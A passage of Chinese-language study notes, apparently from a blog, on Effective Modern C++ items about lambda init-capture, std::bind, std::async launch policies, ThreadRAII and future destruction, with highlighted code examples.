std::move(pw)</code>”的意思是“在闭包中创建一个数据成员<code>pw</code>，并使用将<code>std::move</code>应用于局部变量<code>pw</code>的结果来初始化该数据成员”。</p><p>在C++11中，无法捕获表达式的结果。因此，初始化捕获的另一个名称是<strong>通用<em>lambda</em>捕获</strong>（<em>generalizedlambda capture</em>）。</p><p><em>lambda</em>表达式只是生成一个类和创建该类型对象的一种简单方式而已。没什么是你用<em>lambda</em>可以做而不能自己手动实现的。</p><p>C++14的示例代码可以用C++11重新编写，如下所示：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IsValAndArch</span> &#123;</span>                            <span class="hljs-comment">//“is validated and archived”</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">using</span> DataType = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;Widget&gt;;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">IsValAndArch</span><span class="hljs-params">(DataType&amp;&amp; ptr)</span>       <span class="hljs-comment">//条款25解释了std::move的使用</span></span><br><span class="hljs-function">    : <span class="hljs-title">pw</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">move</span>(ptr))</span> </span>&#123;&#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span></span><br><span class="hljs-function">    </span>&#123; <span class="hljs-keyword">return</span> pw-&gt;isValidated() &amp;&amp; pw-&gt;isArchived(); &#125;<br>    <br><span class="hljs-keyword">private</span>:<br>    DataType pw;<br>&#125;;<br><br><span class="hljs-keyword">auto</span> func = IsValAndArch(<span class="hljs-built_in">std</span>::make_unique&lt;Widget&gt;());<br></code></pre></div></td></tr></table></figure><p>使用 <code>bind</code> 的解决方法：</p><p>C++11的等效代码如下，其中我强调了相同的关键事项：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt; data;           <br><br>…                                      <br><br><span class="hljs-keyword">auto</span> func =<br>    <span class="hljs-built_in">std</span>::bind(                              <span class="hljs-comment">//C++11模拟初始化捕获</span><br>        [](<span class="hljs-keyword">const</span> <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt;&amp; data) <span class="hljs-comment">//译者注：本行高亮</span><br>        &#123; <span class="hljs-comment">/*使用data*/</span> &#125;,<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">move</span>(data)                     <span class="hljs-comment">//译者注：本行高亮</span><br>    );<br></code></pre></div></td></tr></table></figure><p>默认情况下，从<em>lambda</em>生成的闭包类中的<code>operator()</code>成员函数为<code>const</code>的。在<em>lambda</em>主体内把闭包中的所有数据成员渲染为<code>const</code>。</p><p>但是，bind对象内部的移动构造的<code>data</code>副本不是<code>const</code>的，因此，为了防止在<em>lambda</em>内修改该<code>data</code>副本，<em>lambda</em>的形参应声明为reference-to-<code>const</code>。如果将<em>lambda</em>声明为<code>mutable</code>，则闭包类中的<code>operator()</code>将不会声明为<code>const</code>，并且在<em>lambda</em>的形参声明中省略<code>const</code>也是合适的：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> func =<br>    <span class="hljs-built_in">std</span>::bind(                                  <span class="hljs-comment">//C++11对mutable lambda</span><br>        [](<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">double</span>&gt;&amp; data) <span class="hljs-keyword">mutable</span><span class="hljs-comment">//初始化捕获的模拟</span><br>        &#123; <span class="hljs-comment">/*使用data*/</span> &#125;,<br>        <span class="hljs-built_in">std</span>::<span class="hljs-built_in">move</span>(data)<br>    );<br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>使用C++14的初始化捕获将对象移动到闭包中。</li><li>在C++11中，可以通过手写类或<code>std::bind</code>的方式来模拟初始化捕获。</li></ul><h2><span id="33对autoampamp形参使用decltype">33对<code>auto&amp;&amp;</code>形参使用<code>decltype</code></span></h2><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> f = [](<span class="hljs-keyword">auto</span>&amp;&amp; x)<br>         &#123; <span class="hljs-keyword">return</span> func(normalize(<span class="hljs-built_in">std</span>::forward&lt;???&gt;(x))); &#125;;<br></code></pre></div></td></tr></table></figure><p>这里的<code>???</code>该是什么？</p><p>在泛型<em>lambda</em>中，没有可用的类型参数<code>T</code>。在<em>lambda</em>生成的闭包里，模版化的<code>operator()</code>函数中的确有一个<code>T</code>，但在<em>lambda</em>里却无法直接使用它。</p><p>如果一个左值实参被传给通用引用的形参，那么形参类型会变成左值引用。传递的是右值，形参就会变成右值引用。这意味着在这个<em>lambda</em>中，可以通过检查形参<code>x</code>的类型来确定传递进来的实参是一个左值还是右值，<code>decltype</code>就可以实现这样的效果。</p><p>传递给<em>lambda</em>的是一个左值，<code>decltype(x)</code>就能产生一个左值引用；如果传递的是一个右值，<code>decltype(x)</code>就会产生右值引用。</p><p>在调用<code>std::forward</code>时，惯例决定了类型实参是左值引用时来表明要传进左值，类型实参是非引用就表明要传进右值。</p><p>在前面的<em>lambda</em>中，如果<code>x</code>绑定的是一个左值，<code>decltype(x)</code>就能产生一个左值引用。</p><p>然而如果<code>x</code>绑定的是一个右值，<code>decltype(x)</code>就会产生右值引用，而不是常规的非引用。</p><p>但是<code>decltype(x)</code>就会产生右值引用传入<code>std::forward</code>后，引用折叠后的结果和传入非引用的结果是相同的。</p><p>所以<code>decltype(x)</code> 完美解决了问题。</p><p>C++14中的<em>lambda</em>也可以是可变形参的，最后的实现如下：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> f =<br>    [](<span class="hljs-keyword">auto</span>&amp;&amp;... params)<br>    &#123;<br>        <span class="hljs-keyword">return</span><br>            func(normalize(<span class="hljs-built_in">std</span>::forward&lt;<span class="hljs-keyword">decltype</span>(params)&gt;(params)...));<br>    &#125;;<br></code></pre></div></td></tr></table></figure><h2><span id="34优先考虑lambda而非stdbind">34优先考虑<em>lambda</em>而非<code>std::bind</code></span></h2><p>优先<em>lambda</em>而不是<code>std::bind</code>的最重要原因是<em>lambda</em>更易读。</p><p>但是，在C++11中，可以在两种情况下使用<code>std::bind</code>是合理的：</p><ul><li><strong>移动捕获</strong>。C++11的<em>lambda</em>不提供移动捕获，但是可以通过结合<em>lambda</em>和<code>std::bind</code>来模拟。</li><li><strong>多态函数对象</strong>。因为bind对象上的函数调用运算符使用完美转发，所以它可以接受任何类型的实参</li></ul><p>例如：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PolyWidget</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> T&gt;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-keyword">const</span> T&amp; param)</span></span>;<br>    …<br>&#125;;<br></code></pre></div></td></tr></table></figure><p><code>std::bind</code>可以如下绑定一个<code>PolyWidget</code>对象：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">PolyWidget pw;<br><span class="hljs-keyword">auto</span> boundPW = <span class="hljs-built_in">std</span>::bind(pw, _1);<br></code></pre></div></td></tr></table></figure><p><code>boundPW</code>可以接受任意类型的对象了：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++">boundPW(<span class="hljs-number">1930</span>);              <span class="hljs-comment">//传int给PolyWidget::operator()</span><br>boundPW(<span class="hljs-literal">nullptr</span>);           <span class="hljs-comment">//传nullptr给PolyWidget::operator()</span><br>boundPW(<span class="hljs-string">"Rosebud"</span>); <span class="hljs-comment">//传字面值给PolyWidget::operator()</span><br></code></pre></div></td></tr></table></figure><p>这一点无法使用C++11的<em>lambda</em>做到。但是，在C++14中，可以通过带有<code>auto</code>形参的<em>lambda</em>轻松实现：</p><figure class="highlight c++"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c++"><span class="hljs-keyword">auto</span> boundPW = [pw](<span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span>&amp; param)  <span class="hljs-comment">//C++14 </span><br>               &#123; pw(param); &#125;;<br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>与使用<code>std::bind</code>相比，<em>lambda</em>更易读，更具表达力并且可能更高效。</li><li>只有在C++11中，<code>std::bind</code>对实现移动捕获，或者绑定函数模板，会很有用。</li></ul><h2><span id="并发api">并发API</span></h2><p>C++11的伟大成功之一是将并发整合到语言和库中。</p><h2><span id="35优先考虑基于任务的编程而非基于线程的编程">35优先考虑基于任务的编程而非基于线程的编程</span></h2><p>如果开发者想要异步执行<code>doAsyncWork</code>函数，通常有两种方式。其一是通过创建<code>std::thread</code>执行<code>doAsyncWork</code>，这是应用了<strong>基于线程</strong>（<em>thread-based</em>）的方式：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">doAsyncWork</span><span class="hljs-params">()</span></span>;<br><span class="hljs-function"><span class="hljs-built_in">std</span>::thread <span class="hljs-title">t</span><span class="hljs-params">(doAsyncWork)</span></span>;<br></code></pre></div></td></tr></table></figure><p>其二是将<code>doAsyncWork</code>传递给<code>std::async</code>，一种<strong>基于任务</strong>（<em>task-based</em>）的策略：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> fut = <span class="hljs-built_in">std</span>::async(doAsyncWork); <span class="hljs-comment">//“fut”表示“future”</span><br></code></pre></div></td></tr></table></figure><p>这种方式中，传递给<code>std::async</code>的函数对象被称为一个<strong>任务</strong>（<em>task</em>）。</p><p>基于任务的方法通常比基于线程的方法更优：</p><ul><li>代码量更少</li><li>如果 task 的返回值是必需的，那么 <em>thread-based</em>的方式将无能为力。而基于任务的方法就简单了，因为<code>std::async</code>返回的<em>future</em>提供了<code>get</code>函数（从而可以获取返回值）。</li><li>如果<code>doAsycnWork</code>发生了异常，<code>get</code>函数就显得更为重要，因为<code>get</code>函数可以提供抛出异常的访问，而基于线程的方法，如果<code>doAsyncWork</code>抛出了异常，程序会直接终止（通过调用<code>std::terminate</code>）。</li></ul><h3><span id="区别">区别</span></h3><p>基于线程与基于任务最根本的区别在于，基于任务的抽象层次更高。基于任务的方式使得开发者从线程管理的细节中解放出来，对此在C++并发软件中总结了“<em>thread</em>”的三种含义：</p><ul><li><strong>硬件线程</strong>（hardwarethreads）是真实执行计算的线程。现代计算机体系结构为每个CPU核心提供一个或者多个硬件线程。</li><li><strong>软件线程</strong>（software threads）（也被称为系统线程（OSthreads、systemthreads））是操作系统管理的在硬件线程上执行的线程。通常可以存在比硬件线程更多数量的软件线程。当软件线程被阻塞的时候（比如I/O、同步锁或者条件变量），操作系统可以调度其他未阻塞的软件线程执行提供吞吐量。</li><li><strong><code>std::thread</code></strong>是C++执行过程的对象，并作为软件线程的句柄（<em>handle</em>）。</li></ul><p>软件线程是有限的资源。如果开发者试图创建大于系统支持的线程数量，会抛出<code>std::system_error</code>异常。</p><p>即使没有超出软件线程的限额，仍然可能会遇到<strong>资源超额</strong>（<em>oversubscription</em>）的麻烦。当前准备运行的（即未阻塞的）软件线程大于硬件线程的数量时，线程调度器会将软件线程时间切片，分配到硬件上。</p><p>当一个软件线程的时间片执行结束，会让给另一个软件线程，此时发生上下文切换。软件线程的上下文切换会增加系统的软件线程管理开销。当软件线程安排到与上次时间片运行时不同的硬件线程上，这个开销会更高。</p><p>使用<code>std::async</code>将线程管理的职责转交给C++标准库的开发者。举个例子，这种调用方式会减少抛出资源超额异常的可能性，因为这个调用可能不会开启一个新的线程。合理的调度器在系统资源超额或者线程耗尽时就会利用这个自由度。</p><p>通过向<code>std::async</code>传递<code>std::launch::async</code>启动策略来保证想运行函数在不同的线程上执行，处理不同线程响应优先级的问题。</p><blockquote><p>线程调度器使用系统级线程池（<em>threadpool</em>）来避免资源超额的问题，并且通过工作窃取算法（<em>work-stealingalgorithm</em>）来提升了跨硬件核心的负载均衡。实现更为繁琐。</p><p>直接使用<code>std::thread</code>编程，处理线程耗尽、资源超额、负责均衡问题的责任就压在了你身上，更不用说你对这些问题的解决方法与同机器上其他程序采用的解决方案配合得好不好了。</p></blockquote><p>基于任务的设计为开发者避免了手动线程管理的痛苦，并且自然提供了一种获取异步执行程序的结果（即返回值或者异常）的方式。当然，仍然存在一些场景直接使用<code>std::thread</code>会更有优势：</p><ul><li><strong>你需要访问非常基础的线程API</strong>。C++并发API通常是通过操作系统提供的系统级API（pthreads或者Windowsthreads）来实现的，系统级API通常会提供更加灵活的操作方式（举个例子，C++没有线程优先级和亲和性的概念）。为了提供对底层系统级线程API的访问，<code>std::thread</code>对象提供了<code>native_handle</code>的成员函数，而<code>std::future</code>（即<code>std::async</code>返回的东西）没有这种能力。</li><li><strong>你需要且能够优化应用的线程使用</strong>。</li><li><strong>你需要实现C++并发API之外的线程技术</strong>，比如，实现未支持的平台的线程池。</li></ul><h3><span id="结论">结论</span></h3><ul><li><code>std::thread</code>API不能直接访问异步执行的结果，如果执行函数有异常抛出，代码会终止执行。</li><li>基于线程的编程方式需要手动的线程耗尽、资源超额、负责均衡、平台适配性管理。</li><li>通过带有默认启动策略的<code>std::async</code>进行基于任务的编程方式会解决大部分问题。</li></ul><h2><span id="36如有必要指定stdlaunchasync">36如有必要指定<code>std::launch::async</code></span></h2><ul><li><strong><code>std::launch::async</code>启动策略</strong>意味着<code>f</code>必须异步执行，即在不同的线程。</li><li><strong><code>std::launch::deferred</code>启动策略</strong>意味着<code>f</code>仅当在<code>std::async</code>返回的<em>future</em>上调用<code>get</code>或者<code>wait</code>时才执行。这表示<code>f</code><strong>推迟</strong>到存在这样的调用时才执行。当<code>get</code>或<code>wait</code>被调用，<code>f</code>会同步执行，即调用方被阻塞，直到<code>f</code>运行结束。如果<code>get</code>和<code>wait</code>都没有被调用，<code>f</code>将不会被执行。</li></ul><p><code>std::async</code>的默认启动策略，如果你不显式指定一个策略，不是上面中任意一个。相反，是求或在一起的。下面的两种调用含义相同：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> fut1 = <span class="hljs-built_in">std</span>::async(f);                      <span class="hljs-comment">//使用默认启动策略运行f</span><br><span class="hljs-keyword">auto</span> fut2 = <span class="hljs-built_in">std</span>::async(<span class="hljs-built_in">std</span>::launch::async |     <span class="hljs-comment">//使用async或者deferred运行f</span><br>                       <span class="hljs-built_in">std</span>::launch::deferred,<br>                       f);<br></code></pre></div></td></tr></table></figure><p>因此默认策略允许<code>f</code>异步或者同步执行。</p><p>这导致了三种结果：</p><ul><li><strong>无法预测<code>f</code>是否会与<code>t</code>并发运行</strong>，因为<code>f</code>可能被安排延迟运行。</li><li><strong>无法预测<code>f</code>是否会在与某线程相异的另一线程上执行，这个某线程在<code>fut</code>上调用<code>get</code>或<code>wait</code></strong>。如果对<code>fut</code>调用函数的线程是<code>t</code>，无法预测<code>f</code>是否在异于<code>t</code>的另一线程上执行。</li><li><strong>无法预测<code>f</code>是否执行</strong>。</li></ul><p>所以，以下循环看似应该最终会终止，但可能实际上永远运行：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>::literals;      <span class="hljs-comment">//为了使用C++14中的时间段后缀</span><br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">f</span><span class="hljs-params">()</span>                            <span class="hljs-comment">//f休眠1秒，然后返回</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">std</span>::this_thread::sleep_for(<span class="hljs-number">1</span>s);<br>&#125;<br><br><span class="hljs-keyword">auto</span> fut = <span class="hljs-built_in">std</span>::async(f);           <span class="hljs-comment">//异步运行f（理论上）</span><br><br><span class="hljs-keyword">while</span> (fut.wait_for(<span class="hljs-number">100</span>ms) !=       <span class="hljs-comment">//循环，直到f完成运行时停止...</span><br>       <span class="hljs-built_in">std</span>::future_status::ready)   <span class="hljs-comment">//但是有可能永远不会发生！</span><br>&#123;<br>    …<br>&#125;<br></code></pre></div></td></tr></table></figure><p>如果<code>f</code>与调用<code>std::async</code>的线程并发运行（即，如果为<code>f</code>选择的启动策略是<code>std::launch::async</code>），这里没有问题（假定<code>f</code>最终会执行完毕），但是如果<code>f</code>是延迟执行，<code>fut.wait_for</code>将总是返回<code>std::future_status::deferred</code>。这永远不等于<code>std::future_status::ready</code>，循环会永远执行下去。</p><p>改进的方式如下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">auto</span> fut = <span class="hljs-built_in">std</span>::async(f);               <span class="hljs-comment">//同上</span><br><br><span class="hljs-keyword">if</span> (fut.wait_for(<span class="hljs-number">0</span>s) ==                 <span class="hljs-comment">//如果task是deferred（被延迟）状态</span><br>    <span class="hljs-built_in">std</span>::future_status::deferred)<br>&#123;<br>    …                                   <span class="hljs-comment">//在fut上调用wait或get来异步调用f</span><br>&#125; <span class="hljs-keyword">else</span> &#123;                                <span class="hljs-comment">//task没有deferred（被延迟）</span><br>    <span class="hljs-keyword">while</span> (fut.wait_for(<span class="hljs-number">100</span>ms) !=       <span class="hljs-comment">//不可能无限循环（假设f完成）</span><br>           <span class="hljs-built_in">std</span>::future_status::ready) &#123;<br>        …                               <span class="hljs-comment">//task没deferred（被延迟），也没ready（已准备）</span><br>                                        <span class="hljs-comment">//做并行工作直到已准备</span><br>    &#125;<br>    …                                   <span class="hljs-comment">//fut是ready（已准备）状态</span><br>&#125;<br></code></pre></div></td></tr></table></figure><p>一个总是使用 <code>std::launch::async</code> 的函数实现如下：</p><p>C++11版本如下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> F, <span class="hljs-keyword">typename</span>... Ts&gt;<br><span class="hljs-keyword">inline</span><br><span class="hljs-built_in">std</span>::<span class="hljs-built_in">future</span>&lt;<span class="hljs-keyword">typename</span> <span class="hljs-built_in">std</span>::result_of&lt;F(Ts...)&gt;::type&gt;<br>reallyAsync(F&amp;&amp; f, Ts&amp;&amp;... params)          <span class="hljs-comment">//返回异步调用f(params...)得来的future</span><br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::async(<span class="hljs-built_in">std</span>::launch::async,<br>                      <span class="hljs-built_in">std</span>::forward&lt;F&gt;(f),<br>                      <span class="hljs-built_in">std</span>::forward&lt;Ts&gt;(params)...);<br>&#125;<br></code></pre></div></td></tr></table></figure><p>在C++14中，<code>reallyAsync</code>返回类型的推导能力可以简化函数的声明：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-keyword">template</span>&lt;<span class="hljs-keyword">typename</span> F, <span class="hljs-keyword">typename</span>... Ts&gt;<br><span class="hljs-keyword">inline</span><br><span class="hljs-keyword">auto</span>                                        <span class="hljs-comment">// C++14</span><br>reallyAsync(F&amp;&amp; f, Ts&amp;&amp;... params)<br>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">std</span>::async(<span class="hljs-built_in">std</span>::launch::async,<br>                      <span class="hljs-built_in">std</span>::forward&lt;F&gt;(f),<br>                      <span class="hljs-built_in">std</span>::forward&lt;Ts&gt;(params)...);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li><code>std::async</code>的默认启动策略是异步和同步执行兼有的。</li><li><code>std::async</code>的默认启动策略，隐含了任务可能不会被执行的意思，会影响调用基于超时的<code>wait</code>的程序逻辑。</li><li>如果异步执行任务非常关键，则指定<code>std::launch::async</code>。</li></ul><h2><span id="37-使stdthread-是unjoinable-的">37 使<code>std::thread</code> 是unjoinable 的</span></h2><p>每个<code>std::thread</code>对象处于两个状态之一：<strong>可结合的</strong>（<em>joinable</em>）或者<strong>不可结合的</strong>（<em>unjoinable</em>）。</p><p>可结合状态的<code>std::thread</code>对应于正在运行或者可能要运行的异步执行线程。比如，对应于一个阻塞的（<em>blocked</em>）或者等待调度的线程的<code>std::thread</code>是可结合的；对应于运行结束的线程的<code>std::thread</code>也可以认为是可结合的。</p><p>不可结合的 <code>std::thread</code> 包括：</p><ul><li><strong>默认构造的<code>std::thread</code>s</strong>。这种<code>std::thread</code>没有函数执行，因此没有对应到底层执行线程上。</li><li><strong>已经被移动走的<code>std::thread</code>对象</strong>。移动的结果就是一个<code>std::thread</code>原来对应的执行线程现在对应于另一个<code>std::thread</code>。</li><li><strong>已经被<code>join</code>的<code>std::thread</code></strong>。在<code>join</code>之后，<code>std::thread</code>不再对应于已经运行完了的执行线程。</li><li><strong>已经被<code>detach</code>的<code>std::thread</code></strong>。<code>detach</code>断开了<code>std::thread</code>对象与执行线程之间的连接。</li></ul><p>如果发生 <code>std::thread</code> 析构，而 <code>std::thread</code>是 joinable，那么会造成程序终止。析构时发生的<strong>隐式<code>join</code></strong>可能还会访问已经被回收的值。<strong>隐式<code>detach</code></strong>，可能出现访问或者修改没有所有权的内存的行为。</p><p>解决方法，使用 RAII对象类管理，保证每当在执行跳至块之外时，调用局部对象的析构函数。</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ThreadRAII</span> &#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">enum</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DtorAction</span> &#123;</span> join, detach &#125;;         <br><br>    ThreadRAII(<span class="hljs-built_in">std</span>::thread&amp;&amp; t, DtorAction a)       <span class="hljs-comment">// 在析构函数中对t实行a动作</span><br>    : action(a), t(<span class="hljs-built_in">std</span>::move(t)) &#123;&#125;                 <span class="hljs-comment">// `std::thread`不可以复制</span><br><br>    ~ThreadRAII()<br>    &#123;              <br>        <span class="hljs-keyword">if</span> (t.joinable()) &#123;                         <span class="hljs-comment">//可结合性测试见下</span><br>            <span class="hljs-keyword">if</span> (action == DtorAction::join) &#123;<br>                t.join();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                t.detach();<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    ThreadRAII(ThreadRAII&amp;&amp;) = <span class="hljs-keyword">default</span>;             <span class="hljs-comment">//支持移动</span><br>    ThreadRAII&amp; <span class="hljs-keyword">operator</span>=(ThreadRAII&amp;&amp;) = <span class="hljs-keyword">default</span>;<br><br>    <span class="hljs-function"><span class="hljs-built_in">std</span>::thread&amp; <span class="hljs-title">get</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-keyword">return</span> t; &#125;                <br><br><span class="hljs-keyword">private</span>: <span class="hljs-comment">// as before</span><br>    DtorAction action;<br>    <span class="hljs-built_in">std</span>::thread t;        <span class="hljs-comment">// 最后声明，实例化时，前面的成员都是可用状态</span><br>&#125;;<br></code></pre></div></td></tr></table></figure><h3><span id="结论">结论</span></h3><ul><li>析构时<code>join</code>会导致难以调试的表现异常问题。</li><li>析构时<code>detach</code>会导致难以调试的未定义行为。</li><li>声明类数据成员时，最后声明<code>std::thread</code>对象。</li></ul><h2><span id="38-future析构行为">38 future析构行为</span></h2><h3><span id="结论">结论</span></h3><ul><li><em>future</em>的正常析构行为就是销毁<em>future</em>本身的数据成员。</li><li>使用<code>std::async</code>启动的<em>future</em>，引用了共享状态（<code>std::shared_future</code>）的最后一个<em>future</em>的析构函数会阻塞住，直到任务完成。</li></ul><h2><span id="39-简单事件通信">39 简单事件通信</span></h2><p>一个任务通知另一个异步执行的任务发生了特定的事件很有用，因为第二个任务要等到这个事件发生之后才能继续执行。事件也许是一个数据结构已经初始化，也许是计算阶段已经完成，或者检测到重要的传感器值。</p><h3><span id="使用条件变量">使用条件变量</span></h3><p>如果我们将检测条件的任务称为<strong>检测任务</strong>（<em>detectingtask</em>），对条件作出反应的任务称为<strong>反应任务</strong>（<em>reactingtask</em>），策略很简单：反应任务等待一个条件变量，检测任务在事件发生时改变条件变量。代码如下：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cpp"><span class="hljs-built_in">std</span>::condition_variable cv;         <span class="hljs-comment">//事件的条件变量</span><br><span class="hljs-built_in">std</span>::mutex m;                       <span class="hljs-comment">//配合cv使用的mutex</span><br></code></pre></div></td></tr></table></figure><p>检测任务中的代码不能再简单了：</p><figure class="highlight cpp"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span 